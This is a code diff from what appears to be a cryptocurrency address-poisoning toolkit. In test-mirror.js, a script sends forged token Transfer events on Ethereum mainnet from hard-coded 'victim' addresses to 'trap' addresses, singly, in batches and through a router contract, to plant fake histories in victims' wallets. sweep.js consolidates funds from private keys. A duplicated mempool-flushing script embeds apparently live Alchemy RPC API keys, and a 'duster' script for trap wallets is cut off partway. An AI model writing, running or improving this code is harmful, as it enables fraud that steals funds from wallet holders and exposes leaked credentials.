+  if (!DESTINATION_ADDRESS || !ethers.isAddress(DESTINATION_ADDRESS)) {
+    throw new Error('Please set a valid DESTINATION_ADDRESS.');
+  }
+
+  for (const key of PRIVATE_KEYS) {
+    await sweepWallet(key);
+  }
+  console.log('\nConsolidation complete.');
+}
+
+main().catch(console.error);
+===== END FILE: sweep.js =====
+
+
+===== FILE: test-mirror.js =====
+// import 'dotenv/config';
+// import { createPublicClient, createWalletClient, http } from 'viem';
+// import { privateKeyToAccount } from 'viem/accounts';
+// import { mainnet } from 'viem/chains';
+
+// const MIRROR_TOKEN_ADDRESS = process.env.MIRROR_TOKEN_ADDRESS;
+// let OPERATOR_KEY = process.env.MIRROR_OPERATOR_KEY;
+
+// // ─── CLI Mode Selection ───
+// const MODE = process.argv[2] || 'single';  // 'single' or 'batch'
+
+// if (!['single', 'batch'].includes(MODE)) {
+//     console.error('❌ Invalid mode. Use: node test.js single OR node test.js batch');
+//     process.exit(1);
+// }
+
+// console.log(`\n🎯 Test Mode: ${MODE.toUpperCase()}\n`);
+
+// // ─── Fix private key formatting ───
+// if (!OPERATOR_KEY) {
+//     console.error('❌ MIRROR_OPERATOR_KEY not set in .env');
+//     process.exit(1);
+// }
+
+// OPERATOR_KEY = OPERATOR_KEY.trim();
+// if (!OPERATOR_KEY.startsWith('0x')) {
+//     OPERATOR_KEY = `0x${OPERATOR_KEY}`;
+// }
+
+// if (!/^0x[a-fA-F0-9]{64}$/.test(OPERATOR_KEY)) {
+//     console.error('❌ Invalid private key format. Expected 64 hex characters after 0x');
+//     console.error(`Got: ${OPERATOR_KEY.slice(0, 10)}...`);
+//     process.exit(1);
+// }
+
+// console.log(`✅ Private key format valid (${OPERATOR_KEY.slice(0, 10)}...)`);
+
+// // ─── 🆕 Updated ABI with batch function ───
+// const MIRROR_ABI = [
+//     {
+//         "inputs": [
+//             { "internalType": "address", "name": "from", "type": "address" },
+//             { "internalType": "address", "name": "to", "type": "address" },
+//             { "internalType": "uint256", "name": "value", "type": "uint256" }
+//         ],
+//         "name": "transferFrom",
+//         "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+//         "stateMutability": "nonpayable",
+//         "type": "function"
+//     },
+//     // 🆕 Batch emission function
+//     {
+//         "inputs": [
+//             { "internalType": "address[]", "name": "froms", "type": "address[]" },
+//             { "internalType": "address[]", "name": "tos", "type": "address[]" },
+//             { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
+//         ],
+//         "name": "batchEmitTransfers",
+//         "outputs": [],
+//         "stateMutability": "nonpayable",
+//         "type": "function"
+//     }
+// ];
+
+// // ─── DECIMAL SCALING HELPERS ───
+
+// function getDecimals(assetSymbol) {
+//     const decimalsMap = {
+//         // Native coins (18 decimals)
+//         'ETH': 18,
+//         'WETH': 18,
+//         'BNB': 18,
+//         'WBNB': 18,
+//         'MATIC': 18,
+//         'WMATIC': 18,
+
+//         // Stablecoins with 6 decimals
+//         'USDC': 6,
+//         'USDC_NATIVE': 6,
+//         'USDT': 6,
+//         'BUSD': 6,
+
+//         // Stablecoins with 18 decimals
+//         'DAI': 18,
+//         'TUSD': 18,
+//         'FRAX': 18,
+//         'USDP': 18,
+
+//         // BTC variants
+//         'WBTC': 8,
+//         'renBTC': 8,
+//     };
+
+//     const symbol = assetSymbol.toUpperCase();
+//     const decimals = decimalsMap[symbol];
+
+//     if (decimals === undefined) {
+//         console.warn(`⚠️  Unknown token "${assetSymbol}", defaulting to 18 decimals`);
+//         return 18;
+//     }
+
+//     return decimals;
+// }
+
+// function toRawAmount(humanAmount, assetSymbol) {
+//     const decimals = getDecimals(assetSymbol);
+//     const multiplier = 10n ** BigInt(decimals);
+
+//     const amountStr = String(humanAmount);
+
+//     if (amountStr.includes('.')) {
+//         const [whole, frac = ''] = amountStr.split('.');
+//         const paddedFrac = frac.padEnd(decimals, '0').slice(0, decimals);
+//         const combined = whole + paddedFrac;
+//         return BigInt(combined);
+//     } else {
+//         return BigInt(amountStr) * multiplier;
+//     }
+// }
+
+// function toHumanAmount(rawAmount, assetSymbol) {
+//     const decimals = getDecimals(assetSymbol);
+//     const divisor = 10 ** decimals;
+//     return (Number(rawAmount) / divisor).toFixed(decimals <= 8 ? decimals : 6);
+// }
+
+// // ─── Configure test addresses ───
+
+// // Single mode addresses
+// const VICTIM_ADDRESS = '0x86023520Ad2553d0Ec78e9a77E5e08E43FeF61d1';
+// const TRAP_ADDRESS = '0x03f36d3d9be3dbc947573f327346159e5ba09659';
+
+// // 🆕 Batch mode: multiple victims and traps
+// const BATCH_VICTIMS = [
+//     '0xf8cb909c54b761a4b74a5eaf23c7fec49feb9ffc',
+//     '0xf10b3a02d89e2970209add91e9a32b7202997ce5',
+//     '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
+//     '0x9876543210987654321098765432109876543210',
+//     '0xfedcbafedcbafedcbafedcbafedcbafedcbafedc',
+// ];
+
+// const BATCH_TRAPS = [
+//     '0x8fa29bfb9a391895aecf81172fcc78609c167e24',
+//     '0x2345678901234567890123456789012345678901',
+//     '0xbcdefabcdefabcdefabcdefabcdefabcdefabcde',
+//     '0x8765432109876543210987654321098765432109',
+//     '0xedcbafedcbafedcbafedcbafedcbafedcbafedcb',
+// ];
+
+// // ─── Amount configuration ───
+// const ASSET = 'USDT';
+// const HUMAN_AMOUNT = 89539;
+// const MIRROR_AMOUNT = toRawAmount(HUMAN_AMOUNT, ASSET);
+
+// // 🆕 Batch amounts (can be different per victim)
+// const BATCH_AMOUNTS = BATCH_VICTIMS.map((_, i) => {
+//     // Vary amounts slightly for each victim to make it realistic
+//     const variedHuman = HUMAN_AMOUNT + (i * 0.5);
+//     return toRawAmount(variedHuman, ASSET);
+// });
+
+// async function test() {
+//     const account = privateKeyToAccount(OPERATOR_KEY);
+
+//     const publicClient = createPublicClient({
+//         chain: mainnet,
+//         transport: http('https://ethereum.publicnode.com')
+//     });
+
+//     const walletClient = createWalletClient({
+//         account,
+//         chain: mainnet,
+//         transport: http('https://ethereum.publicnode.com')
+//     });
+
+//     console.log(`\n🔑 Operator: ${account.address}`);
+//     console.log(`💰 Operator balance: ${await publicClient.getBalance({ address: account.address })} wei`);
+//     console.log(`📄 Contract: ${MIRROR_TOKEN_ADDRESS}`);
+
+//     if (MODE === 'single') {
+//         // ─── SINGLE MODE ───
+//         console.log(`\n🎯 SINGLE TRANSFER MODE`);
+//         console.log(`👤 Victim: ${VICTIM_ADDRESS}`);
+//         console.log(`🪤 Trap: ${TRAP_ADDRESS}`);
+
+//         const decimals = getDecimals(ASSET);
+//         console.log(`\n🎯 Amount Configuration:`);
+//         console.log(`   Asset: ${ASSET}`);
+//         console.log(`   Decimals: ${decimals}`);
+//         console.log(`   Human amount: ${HUMAN_AMOUNT.toLocaleString()} ${ASSET}`);
+//         console.log(`   Raw amount: ${MIRROR_AMOUNT.toString()}`);
+//         console.log(`   Expected display: ${toHumanAmount(MIRROR_AMOUNT, ASSET)} ${ASSET}`);
+
+//         console.log('\n🚀 Emitting forged Transfer event...');
+
+//         const hash = await walletClient.writeContract({
+//             address: MIRROR_TOKEN_ADDRESS,
+//             abi: MIRROR_ABI,
+//             functionName: 'transferFrom',
+//             args: [VICTIM_ADDRESS, TRAP_ADDRESS, MIRROR_AMOUNT]
+//         });
+
+//         console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);
+
+//         const receipt = await publicClient.waitForTransactionReceipt({ hash });
+//         console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
+//         console.log(`✅ Gas used: ${receipt.gasUsed}`);
+//         console.log(`✅ Logs emitted: ${receipt.logs.length}`);
+
+//         // Decode the log
+//         const log = receipt.logs[0];
+//         console.log(`\n📋 Event Details:`);
+//         console.log(`   Contract: ${log.address}`);
+//         console.log(`   Topic 0 (event signature): ${log.topics[0].slice(0, 20)}...`);
+//         console.log(`   Topic 1 (from): 0x${log.topics[1].slice(26)}`);
+//         console.log(`   Topic 2 (to): 0x${log.topics[2].slice(26)}`);
+
+//         const valueHex = log.data;
+//         const valueBigInt = BigInt(valueHex);
+//         console.log(`   Data (raw value): ${valueBigInt.toString()}`);
+//         console.log(`   Data (human value): ${toHumanAmount(valueBigInt, ASSET)} ${ASSET}`);
+
+//         console.log(`\n🎯 CHECK THESE LINKS:`);
+//         console.log(`   Victim's token history: https://etherscan.io/address/${VICTIM_ADDRESS}#tokentxns`);
+//         console.log(`   Trap's token history: https://etherscan.io/address/${TRAP_ADDRESS}#tokentxns`);
+
+//         console.log(`\n📊 VERIFICATION STEPS:`);
+//         console.log(`   1. Open victim's token history (link above)`);
+//         console.log(`   2. Wait 30-60 seconds for indexing`);
+//         console.log(`   3. Look for OUT transfer of ${HUMAN_AMOUNT.toLocaleString()} ${ASSET}`);
+
+//     } else {
+//         // ─── BATCH MODE ───
+//         console.log(`\n🎯 BATCH TRANSFER MODE`);
+//         console.log(`📦 Batch size: ${BATCH_VICTIMS.length} transfers`);
+
+//         console.log(`\n📋 Batch Configuration:`);
+//         BATCH_VICTIMS.forEach((victim, i) => {
+//             const humanAmt = toHumanAmount(BATCH_AMOUNTS[i], ASSET);
+//             console.log(`   ${i + 1}. ${victim} → ${BATCH_TRAPS[i]} (${humanAmt} ${ASSET})`);
+//         });
+
+//         console.log('\n🚀 Emitting batch forged Transfer events...');
+
+//         const hash = await walletClient.writeContract({
+//             address: MIRROR_TOKEN_ADDRESS,
+//             abi: MIRROR_ABI,
+//             functionName: 'batchEmitTransfers',
+//             args: [BATCH_VICTIMS, BATCH_TRAPS, BATCH_AMOUNTS]
+//         });
+
+//         console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);
+
+//         const receipt = await publicClient.waitForTransactionReceipt({ hash });
+//         console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
+//         console.log(`✅ Gas used: ${receipt.gasUsed}`);
+//         console.log(`✅ Logs emitted: ${receipt.logs.length}`);
+
+//         // Decode all logs
+//         console.log(`\n📋 Batch Event Details:`);
+//         receipt.logs.forEach((log, i) => {
+//             const from = `0x${log.topics[1].slice(26)}`;
+//             const to = `0x${log.topics[2].slice(26)}`;
+//             const valueBigInt = BigInt(log.data);
+//             const humanValue = toHumanAmount(valueBigInt, ASSET);
+
+//             console.log(`\n   Event ${i + 1}:`);
+//             console.log(`      From: ${from}`);
+//             console.log(`      To: ${to}`);
+//             console.log(`      Amount: ${humanValue} ${ASSET} (${valueBigInt.toString()} raw)`);
+//         });
+
+//         console.log(`\n🎯 CHECK THESE LINKS:`);
+//         BATCH_VICTIMS.forEach((victim, i) => {
+//             console.log(`   Victim ${i + 1}: https://etherscan.io/address/${victim}#tokentxns`);
+//         });
+
+//         console.log(`\n📊 VERIFICATION STEPS:`);
+//         console.log(`   1. Open each victim's token history (links above)`);
+//         console.log(`   2. Wait 30-60 seconds for indexing`);
+//         console.log(`   3. Verify each victim has an OUT transfer to their respective trap`);
+//         console.log(`   4. All ${BATCH_VICTIMS.length} transfers should appear in a SINGLE transaction`);
+//     }
+// }
+
+// test().catch(err => {
+//     console.error('❌ Test failed:', err.message);
+//     if (err.message.includes('insufficient funds')) {
+//         console.error('\n💡 Your operator wallet needs ETH for gas. Send ~0.01 ETH to:',
+//             OPERATOR_KEY.startsWith('0x') ? 'check account.address above' : 'run test again to see address');
+//     }
+//     process.exit(1);
+// });
+
+
+
+import 'dotenv/config';
+import { createPublicClient, createWalletClient, http } from 'viem';
+import { privateKeyToAccount } from 'viem/accounts';
+import { mainnet } from 'viem/chains';
+
+const MIRROR_TOKEN_ADDRESS = process.env.MIRROR_TOKEN_ADDRESS;
+const MULTI_TOKEN_ROUTER_ADDRESS = process.env.MULTI_TOKEN_ROUTER;
+let OPERATOR_KEY = process.env.MIRROR_OPERATOR_KEY;
+
+// ─── CLI Mode Selection ───
+const MODE = process.argv[2] || 'single';  // 'single', 'batch', or 'router'
+
+if (!['single', 'batch', 'router'].includes(MODE)) {
+    console.error('❌ Invalid mode. Use: node test-mirror.js single OR node test-mirror.js batch OR node test-mirror.js router');
+    process.exit(1);
+}
+
+console.log(`\n🎯 Test Mode: ${MODE.toUpperCase()}\n`);
+
+// ─── Fix private key formatting ───
+if (!OPERATOR_KEY) {
+    console.error('❌ MIRROR_OPERATOR_KEY not set in .env');
+    process.exit(1);
+}
+
+OPERATOR_KEY = OPERATOR_KEY.trim();
+if (!OPERATOR_KEY.startsWith('0x')) {
+    OPERATOR_KEY = `0x${OPERATOR_KEY}`;
+}
+
+if (!/^0x[a-fA-F0-9]{64}$/.test(OPERATOR_KEY)) {
+    console.error('❌ Invalid private key format. Expected 64 hex characters after 0x');
+    console.error(`Got: ${OPERATOR_KEY.slice(0, 10)}...`);
+    process.exit(1);
+}
+
+console.log(`✅ Private key format valid (${OPERATOR_KEY.slice(0, 10)}...)`);
+
+// ─── ABIs ───
+const MIRROR_ABI = [
+    {
+        "inputs": [
+            { "internalType": "address", "name": "from", "type": "address" },
+            { "internalType": "address", "name": "to", "type": "address" },
+            { "internalType": "uint256", "name": "value", "type": "uint256" }
+        ],
+        "name": "transferFrom",
+        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            { "internalType": "address[]", "name": "froms", "type": "address[]" },
+            { "internalType": "address[]", "name": "tos", "type": "address[]" },
+            { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
+        ],
+        "name": "batchEmitTransfers",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+const ROUTER_ABI = [
+    {
+        "inputs": [
+            {
+                "components": [
+                    { "internalType": "address", "name": "target", "type": "address" },
+                    { "internalType": "address[]", "name": "froms", "type": "address[]" },
+                    { "internalType": "address[]", "name": "tos", "type": "address[]" },
+                    { "internalType": "uint256[]", "name": "values", "type": "uint256[]" }
+                ],
+                "internalType": "struct MultiTokenBatchRouter.BatchCall[]",
+                "name": "calls",
+                "type": "tuple[]"
+            }
+        ],
+        "name": "transfer",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+// ─── DECIMAL SCALING HELPERS ───
+function getDecimals(assetSymbol) {
+    const decimalsMap = {
+        'ETH': 18, 'WETH': 18, 'BNB': 18, 'WBNB': 18, 'MATIC': 18, 'WMATIC': 18,
+        'USDC': 6, 'USDC_NATIVE': 6, 'USDT': 6, 'BUSD': 6,
+        'DAI': 18, 'TUSD': 18, 'FRAX': 18, 'USDP': 18,
+        'WBTC': 8, 'renBTC': 8,
+    };
+    const symbol = assetSymbol.toUpperCase();
+    const decimals = decimalsMap[symbol];
+    if (decimals === undefined) {
+        console.warn(`⚠️  Unknown token "${assetSymbol}", defaulting to 18 decimals`);
+        return 18;
+    }
+    return decimals;
+}
+
+function toRawAmount(humanAmount, assetSymbol) {
+    const decimals = getDecimals(assetSymbol);
+    const multiplier = 10n ** BigInt(decimals);
+    const amountStr = String(humanAmount);
+    if (amountStr.includes('.')) {
+        const [whole, frac = ''] = amountStr.split('.');
+        const paddedFrac = frac.padEnd(decimals, '0').slice(0, decimals);
+        return BigInt(whole + paddedFrac);
+    } else {
+        return BigInt(amountStr) * multiplier;
+    }
+}
+
+function toHumanAmount(rawAmount, assetSymbol) {
+    const decimals = getDecimals(assetSymbol);
+    const divisor = 10 ** decimals;
+    return (Number(rawAmount) / divisor).toFixed(decimals <= 8 ? decimals : 6);
+}
+
+// ─── Configure test addresses ───
+const VICTIM_ADDRESS = '0x86023520Ad2553d0Ec78e9a77E5e08E43FeF61d1';
+const TRAP_ADDRESS = '0x03f36d3d9be3dbc947573f327346159e5ba09659';
+
+const BATCH_VICTIMS = [
+    '0xec34c888A0445c34C6BBBbCAf00bAA16B28083c9',
+    '0xf10b3a02d89e2970209add91e9a32b7202997ce5',
+    // '0xabcdefabcdefabcdefabcdefabcdefabcdefabcd',
+    // '0x9876543210987654321098765432109876543210',
+    // '0xfedcbafedcbafedcbafedcbafedcbafedcbafedc',
+];
+
+const BATCH_TRAPS = [
+    '0xE81f5b7449b88F85a2544b3D4ff3150Fae7c9B96',
+    '0x2345678901234567890123456789012345678901',
+    // '0xbcdefabcdefabcdefabcdefabcdefabcdefabcde',
+    // '0x8765432109876543210987654321098765432109',
+    // '0xedcbafedcbafedcbafedcbafedcbafedcbafedcb',
+];
+
+const ASSET = 'USDC';
+const HUMAN_AMOUNT = 50539;
+const MIRROR_AMOUNT = toRawAmount(HUMAN_AMOUNT, ASSET);
+
+const BATCH_AMOUNTS = BATCH_VICTIMS.map((_, i) => {
+    const variedHuman = HUMAN_AMOUNT + (i * 0.5);
+    return toRawAmount(variedHuman, ASSET);
+});
+
+async function test() {
+    const account = privateKeyToAccount(OPERATOR_KEY);
+
+    const publicClient = createPublicClient({
+        chain: mainnet,
+        transport: http('https://ethereum.publicnode.com')
+    });
+
+    const walletClient = createWalletClient({
+        account,
+        chain: mainnet,
+        transport: http('https://ethereum.publicnode.com')
+    });
+
+    console.log(`\n🔑 Operator: ${account.address}`);
+    console.log(`💰 Operator balance: ${await publicClient.getBalance({ address: account.address })} wei`);
+
+    if (MODE === 'single') {
+        console.log(`\n🎯 SINGLE TRANSFER MODE`);
+        console.log(`📄 Contract: ${MIRROR_TOKEN_ADDRESS}`);
+        const hash = await walletClient.writeContract({
+            address: MIRROR_TOKEN_ADDRESS,
+            abi: MIRROR_ABI,
+            functionName: 'transferFrom',
+            args: [VICTIM_ADDRESS, TRAP_ADDRESS, MIRROR_AMOUNT]
+        });
+        console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);
+        const receipt = await publicClient.waitForTransactionReceipt({ hash });
+        console.log(`✅ Confirmed. Status: ${receipt.status}`);
+
+    } else if (MODE === 'batch') {
+        console.log(`\n🎯 DIRECT BATCH MODE`);
+        console.log(`📄 Contract: ${MIRROR_TOKEN_ADDRESS}`);
+        const hash = await walletClient.writeContract({
+            address: MIRROR_TOKEN_ADDRESS,
+            abi: MIRROR_ABI,
+            functionName: 'batchEmitTransfers',
+            args: [BATCH_VICTIMS, BATCH_TRAPS, BATCH_AMOUNTS]
+        });
+        console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);
+        const receipt = await publicClient.waitForTransactionReceipt({ hash });
+        console.log(`✅ Confirmed. Status: ${receipt.status}`);
+
+    } else if (MODE === 'router') {
+        // ─── ROUTER MODE (Multi-Token Batch) ───
+        if (!MULTI_TOKEN_ROUTER_ADDRESS) {
+            console.error('❌ MULTI_TOKEN_ROUTER not set in .env');
+            process.exit(1);
+        }
+
+        console.log(`\n🎯 ROUTER TRANSFER MODE (Multi-Token Batch)`);
+        console.log(`📡 Router Contract: ${MULTI_TOKEN_ROUTER_ADDRESS}`);
+        console.log(`📄 Target Mirror Contract: ${MIRROR_TOKEN_ADDRESS}`);
+
+        // Split into 2 calls to simulate multi-token routing
+        const calls = [
+            {
+                target: MIRROR_TOKEN_ADDRESS,
+                froms: BATCH_VICTIMS.slice(0, 3),
+                tos: BATCH_TRAPS.slice(0, 3),
+                values: BATCH_AMOUNTS.slice(0, 3)
+            },
+            {
+                target: MIRROR_TOKEN_ADDRESS,
+                froms: BATCH_VICTIMS.slice(3),
+                tos: BATCH_TRAPS.slice(3),
+                values: BATCH_AMOUNTS.slice(3)
+            }
+        ];
+
+        console.log(`\n📋 Router Batch Configuration:`);
+        calls.forEach((call, i) => {
+            console.log(`   Call ${i + 1}: Target ${call.target} (${call.froms.length} transfers)`);
+        });
+
+        console.log('\n🚀 Emitting Router batch forged Transfer events...');
+
+        const hash = await walletClient.writeContract({
+            address: MULTI_TOKEN_ROUTER_ADDRESS,
+            abi: ROUTER_ABI,
+            functionName: 'transfer',
+            args: [calls]
+        });
+
+        console.log(`✅ TX broadcasted: https://etherscan.io/tx/${hash}`);
+
+        const receipt = await publicClient.waitForTransactionReceipt({ hash });
+        console.log(`✅ Confirmed in block ${receipt.blockNumber}`);
+        console.log(`✅ Gas used: ${receipt.gasUsed}`);
+        console.log(`✅ Status: ${receipt.status}`);
+        console.log(`✅ Logs emitted: ${receipt.logs.length}`);
+    }
+}
+
+test().catch(err => {
+    console.error('❌ Test failed:', err.message);
+    if (err.message.includes('insufficient funds')) {
+        console.error('\n💡 Your operator wallet needs ETH for gas.');
+    } else if (err.message.includes('execution reverted')) {
+        console.error('\n💡 The contract REVERTED! Check Etherscan for the exact revert reason.');
+    }
+    process.exit(1);
+});
+===== END FILE: test-mirror.js =====
+
+
+===== FILE: tools/clear_mempool.py =====
+#!/usr/bin/env python3
+"""
+Multi-RPC Mempool Cleaner for Polygon.
+Iterates through the entire RPC rotation list to flush ghost transactions on every node.
+"""
+from web3 import Web3
+import sys
+import time
+
+# 1. 🔴 PASTE YOUR FUNDING PRIVATE KEY HERE 🔴
+PRIVATE_KEY = ""
+
+# 2. The exact RPC rotation list used by your batch_fund.py
+RPC_LIST = [
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+]
+
+def main():
+    if "PASTE_YOUR" in PRIVATE_KEY:
+        print("❌ Please edit this file and paste your actual Private Key at the top.")
+        sys.exit(1)
+
+    account = Web3().eth.account.from_key(PRIVATE_KEY)
+    address = account.address
+    print(f"👛 Target Wallet: {address}\n")
+
+    total_flushed = 0
+
+    # 3. Iterate through EVERY RPC in the rotation
+    for rpc_url in RPC_LIST:
+        print(f"🔗 Connecting to: {rpc_url}")
+        w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 10}))
+        
+        try:
+            if not w3.is_connected():
+                print("   ⚠️ Failed to connect. Skipping.\n")
+                continue
+        except Exception:
+            print("   ⚠️ Connection error. Skipping.\n")
+            continue
+
+        # Check nonces for this specific RPC node
+        latest_nonce = w3.eth.get_transaction_count(address, 'latest')
+        pending_nonce = w3.eth.get_transaction_count(address, 'pending')
+
+        if pending_nonce <= latest_nonce:
+            print(f"   ✅ Clean! (Latest: {latest_nonce}, Pending: {pending_nonce})\n")
+            continue
+
+        stuck_count = pending_nonce - latest_nonce
+        print(f"   ⚠️ Found {stuck_count} ghost transactions on this node!")
+        print(f"   🧹 Flushing nonces {latest_nonce} to {pending_nonce - 1}...\n")
+
+        # Flush the ghosts on THIS specific node
+        for i in range(stuck_count):
+            nonce_to_clear = latest_nonce + i
+            
+            tx = {
+                'to': address,
+                'value': 0,
+                'gas': 21000,
+                'gasPrice': w3.to_wei(1000, 'gwei'), # High gas to force replacement
+                'nonce': nonce_to_clear,
+                'chainId': 137
+            }
+            
+            signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+            try:
+                # 🚨 FIX: Use raw_transaction (with underscore) for Web3.py v6+ compatibility
+                tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+                print(f"      -> Flushed nonce {nonce_to_clear}: {tx_hash.hex()}")
+                total_flushed += 1
+            except Exception as e:
+                print(f"      -> Failed to flush nonce {nonce_to_clear}: {e}")
+        
+        # Small delay to prevent rate limiting the RPCs
+        time.sleep(1) 
+
+    print("\n" + "="*50)
+    if total_flushed > 0:
+        print(f"🎉 COMPLETE! Flushed {total_flushed} ghost transactions across the RPC rotation.")
+    else:
+        print("🎉 COMPLETE! All RPC nodes in your rotation are completely clean.")
+    print("👉 You can now safely restart batch_fund.py on your server.")
+    print("="*50)
+
+if __name__ == "__main__":
+    main()
+===== END FILE: tools/clear_mempool.py =====
+
+
+===== FILE: tools/clear_mempool.py =====
+#!/usr/bin/env python3
+"""
+Multi-RPC Mempool Cleaner for Polygon.
+Iterates through the entire RPC rotation list to flush ghost transactions on every node.
+"""
+from web3 import Web3
+import sys
+import time
+
+# 1. 🔴 PASTE YOUR FUNDING PRIVATE KEY HERE 🔴
+PRIVATE_KEY = ""
+
+# 2. The exact RPC rotation list used by your batch_fund.py
+RPC_LIST = [
+    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
+    'https://polygon-rpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
+    'https://rpc.ankr.com/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
+    'https://polygon.llamarpc.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
+    'https://polygon.publicnode.com',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
+    'https://1rpc.io/polygon',
+    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+]
+
+def main():
+    if "PASTE_YOUR" in PRIVATE_KEY:
+        print("❌ Please edit this file and paste your actual Private Key at the top.")
+        sys.exit(1)
+
+    account = Web3().eth.account.from_key(PRIVATE_KEY)
+    address = account.address
+    print(f"👛 Target Wallet: {address}\n")
+
+    total_flushed = 0
+
+    # 3. Iterate through EVERY RPC in the rotation
+    for rpc_url in RPC_LIST:
+        print(f"🔗 Connecting to: {rpc_url}")
+        w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': 10}))
+        
+        try:
+            if not w3.is_connected():
+                print("   ⚠️ Failed to connect. Skipping.\n")
+                continue
+        except Exception:
+            print("   ⚠️ Connection error. Skipping.\n")
+            continue
+
+        # Check nonces for this specific RPC node
+        latest_nonce = w3.eth.get_transaction_count(address, 'latest')
+        pending_nonce = w3.eth.get_transaction_count(address, 'pending')
+
+        if pending_nonce <= latest_nonce:
+            print(f"   ✅ Clean! (Latest: {latest_nonce}, Pending: {pending_nonce})\n")
+            continue
+
+        stuck_count = pending_nonce - latest_nonce
+        print(f"   ⚠️ Found {stuck_count} ghost transactions on this node!")
+        print(f"   🧹 Flushing nonces {latest_nonce} to {pending_nonce - 1}...\n")
+
+        # Flush the ghosts on THIS specific node
+        for i in range(stuck_count):
+            nonce_to_clear = latest_nonce + i
+            
+            tx = {
+                'to': address,
+                'value': 0,
+                'gas': 21000,
+                'gasPrice': w3.to_wei(1000, 'gwei'), # High gas to force replacement
+                'nonce': nonce_to_clear,
+                'chainId': 137
+            }
+            
+            signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
+            try:
+                # 🚨 FIX: Use raw_transaction (with underscore) for Web3.py v6+ compatibility
+                tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
+                print(f"      -> Flushed nonce {nonce_to_clear}: {tx_hash.hex()}")
+                total_flushed += 1
+            except Exception as e:
+                print(f"      -> Failed to flush nonce {nonce_to_clear}: {e}")
+        
+        # Small delay to prevent rate limiting the RPCs
+        time.sleep(1) 
+
+    print("\n" + "="*50)
+    if total_flushed > 0:
+        print(f"🎉 COMPLETE! Flushed {total_flushed} ghost transactions across the RPC rotation.")
+    else:
+        print("🎉 COMPLETE! All RPC nodes in your rotation are completely clean.")
+    print("👉 You can now safely restart batch_fund.py on your server.")
+    print("="*50)
+
+if __name__ == "__main__":
+    main()
+===== END FILE: tools/clear_mempool.py =====
+
+
+===== FILE: tools/duster.py =====
+#!/usr/bin/env python3
+import sys
+import os
+import re
+import time
+import argparse
+import json
+import urllib.request
+from datetime import datetime, timezone
+from web3 import Web3
+from dotenv import load_dotenv
+from web3.exceptions import TimeExhausted
+
+# --- Ensure we don't let .env overwrite OS-level PM2 variables ---
+load_dotenv(override=False)
+
+# --- Gas Reserve Configuration ---
+# Amount in USD to keep as a reserve in the trap wallet for future gas fees
+GAS_RESERVE_USD = float(os.getenv("GAS_RESERVE_USD", "0.20"))
+
+# --- Official POA middleware import ---
+try:
+    from web3.middleware import geth_poa_middleware
+except ImportError:
+    try:
+        from web3.middleware import poa
+        geth_poa_middleware = poa
+    except ImportError:
+        try:
+            from web3.middleware import geth_poa
+            geth_poa_middleware = geth_poa
+        except ImportError:
+            geth_poa_middleware = None
+            print('[DEBUG] POA middleware not found; BSC/Polygon may have extraData errors.')
+
+# Add project root to path
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
+from lib.config import config
+from lib.logger import logger
+from lib.notifier import send_telegram
+from lib.shutdown import setup_graceful_shutdown
+from lib.encryption import decrypt
+
+# --- Supabase client for job tracking ---
+try:
+    from supabase import create_client
+except ImportError:
+    create_client = None
+
+SUPABASE_URL = os.getenv("NEXT_PUBLIC_SUPABASE_URL")
+SUPABASE_KEY = os.getenv("SUPABASE_SERVICE_ROLE_KEY")
+supabase = None
+if SUPABASE_URL and SUPABASE_KEY and create_client:
+    # 🚀 FIX: Compatible with both Supabase v1.x and v2.x+
+    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+    
+    # Manually patch the underlying HTTP client timeout if it exists
